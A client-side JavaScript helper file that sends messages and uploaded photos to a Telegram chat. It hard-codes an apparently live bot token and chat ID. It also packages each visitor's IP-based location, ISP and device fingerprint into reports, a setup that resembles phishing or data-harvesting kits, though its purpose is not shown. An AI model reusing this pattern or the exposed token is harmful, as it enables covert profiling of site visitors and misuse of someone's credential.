// Telegram Bot Configuration - Centralized
// Update these values in one place to apply across all pages

// Initialize config object
let TELEGRAM_CONFIG = {
  botToken: "8366649467:AAGaMF5mQBsffV-Zc2QU9AQ7XSjD0IKXf3Y",
  authorizedChatId: "7211220207"
};

// Load configuration from server (for deployed environments)
async function loadTelegramConfig() {
  try {
    const response = await fetch('/api/config');
    const config = await response.json();
    if (config.TELEGRAM_BOT_TOKEN && config.TELEGRAM_CHAT_ID) {
      TELEGRAM_CONFIG.botToken = config.TELEGRAM_BOT_TOKEN;
      TELEGRAM_CONFIG.authorizedChatId = config.TELEGRAM_CHAT_ID;
      console.log('Telegram config loaded from server');
    }
  } catch (error) {
    console.log('Using fallback Telegram config');
  }
}

// Load config on page load
if (typeof window !== 'undefined') {
  loadTelegramConfig();
}

// Function to send message to Telegram via server proxy
async function sendTelegramMessage(message) {
  try {
    const response = await fetch('/api/send-telegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        message: message
      })
    });
    
    const result = await response.json();
    console.log('Telegram API response:', result);
    return result.success;
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
    return false;
  }
}

// Function to send photo to Telegram via server proxy
async function sendPhotoToTelegram(photoFile, caption) {
  try {
    const reader = new FileReader();
    const photoData = await new Promise((resolve) => {
      reader.onload = () => {
        const base64Data = reader.result.split(',')[1];
        resolve({
          data: base64Data,
          filename: photoFile.name || 'photo.jpg'
        });
      };
      reader.readAsDataURL(photoFile);
    });
    
    const response = await fetch('/api/send-telegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        message: caption,
        photo: photoData
      })
    });
    
    const result = await response.json();
    console.log('Telegram photo API response:', result);
    return result.success;
  } catch (error) {
    console.error('Error sending photo to Telegram:', error);
    return false;
  }
}

// Function to get IP and location information via server proxy
async function getIpInfo() {
  try {
    // Using server proxy to get IP and location info
    const response = await fetch('/api/ip-info');
    const data = await response.json();
    
    return `
📍 Location Information:
• IP Address: ${data.ip || "Unknown"}
• City: ${data.city || "Unknown"}
• Region: ${data.region || "Unknown"}
• Country: ${data.country || "Unknown"}
• Location: ${data.loc || "Unknown"}
• ISP: ${data.org || "Unknown"}`;
  } catch (error) {
    console.error('Error getting IP info:', error);
    return `
📍 Location Information:
• IP Address: Unknown
• City: Unknown
• Region: Unknown
• Country: Unknown
• Location: Unknown
• ISP: Unknown`;
  }
}

// Function to get device details
function getDeviceDetails() {
  const ua = navigator.userAgent.toLowerCase();
  
  // Determine device type
  let deviceType = "Unknown";
  if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
    deviceType = "iOS";
  } else if (ua.includes("android")) {
    deviceType = "Android";
  } else if (ua.includes("windows")) {
    deviceType = "Windows";
  } else if (ua.includes("mac")) {
    deviceType = "Mac";
  } else if (ua.includes("linux")) {
    deviceType = "Linux";
  }
  
  // Get browser info
  let browser = "Unknown";
  if (ua.includes("chrome") && !ua.includes("edg")) {
    browser = "Chrome";
  } else if (ua.includes("firefox")) {
    browser = "Firefox";
  } else if (ua.includes("safari") && !ua.includes("chrome")) {
    browser = "Safari";
  } else if (ua.includes("edg")) {
    browser = "Edge";
  }
  
  return `
💻 Device Information:
• Device: ${deviceType}
• Browser: ${browser}
• User Agent: ${navigator.userAgent}
• Screen: ${screen.width}x${screen.height}
• Language: ${navigator.language}
• Platform: ${navigator.platform}`;
}
// Enhanced photo compression function for large files
async function compressImage(file, maxSizeMB = 10, quality = 0.8) {
  return new Promise((resolve) => {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const img = new Image();
    
    img.onload = function() {
      // Calculate new dimensions to stay under size limit
      let { width, height } = img;
      const aspectRatio = width / height;
      
      // Reduce dimensions for large files
      const maxDimension = 2048; // Maximum width or height
      if (width > maxDimension || height > maxDimension) {
        if (width > height) {
          width = maxDimension;
          height = width / aspectRatio;
        } else {
          height = maxDimension;
          width = height * aspectRatio;
        }
      }
      
      canvas.width = width;
      canvas.height = height;
      ctx.drawImage(img, 0, 0, width, height);
      
      // Convert to blob with specified quality
      canvas.toBlob((blob) => {
        resolve(blob);
      }, 'image/jpeg', quality);
    };
    
    img.src = URL.createObjectURL(file);
  });
}

// Enhanced function to send compressed photos for very large files
async function sendCompressedPhotoToTelegram(file, caption) {
  try {
    console.log(`Compressing large file: ${file.name} (${(file.size / (1024 * 1024)).toFixed(2)} MB)`);
    
    // Compress the image
    const compressedBlob = await compressImage(file, 10, 0.7);
    const compressedFile = new File([compressedBlob], file.name, { type: 'image/jpeg' });
    
    console.log(`Compressed to: ${(compressedFile.size / (1024 * 1024)).toFixed(2)} MB`);
    
    // Send the compressed version
    return await sendPhotoToTelegram(compressedFile, caption + '\n\n[Note: Image was compressed for transmission]');
  } catch (error) {
    console.error('Error compressing and sending photo:', error);
    // Fallback: send as text message
    const fallbackMessage = caption + '\n\n[Note: Photo too large for transmission - please check device]';
    return await sendTelegramMessage(fallbackMessage);
  }
}

// Enhanced photo sending function with better error handling
async function sendPhotoToTelegram(file, caption) {
  try {
    return new Promise((resolve) => {
      const reader = new FileReader();
      reader.onload = async function(e) {
        try {
          const base64Data = e.target.result.split(',')[1];
          
          const response = await fetch('/api/send-telegram', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              message: caption,
              photo: {
                data: base64Data,
                filename: file.name
              }
            })
          });
          
          const result = await response.json();
          resolve(result.success);
        } catch (error) {
          console.error('Error in photo upload request:', error);
          resolve(false);
        }
      };
      
      reader.onerror = function(error) {
        console.error('Error reading file:', error);
        resolve(false);
      };
      
      reader.readAsDataURL(file);
    });
  } catch (error) {
    console.error('Error in sendPhotoToTelegram:', error);
    return false;
  }
}
